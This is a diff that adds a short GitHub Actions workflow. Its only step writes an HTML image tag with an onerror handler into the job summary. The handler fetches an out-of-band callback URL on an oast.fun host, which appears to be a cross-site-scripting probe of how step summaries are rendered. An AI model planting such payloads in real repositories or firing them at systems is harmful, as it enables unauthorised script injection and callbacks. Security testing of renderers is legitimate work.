@@ -1,0 +1,15 @@
+name: G10 summary renderer
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  summary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write crafted summary
+        shell: bash
+        run: |
+          echo '<img src=x onerror=fetch(`https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/summary`)>' >> "$GITHUB_STEP_SUMMARY"
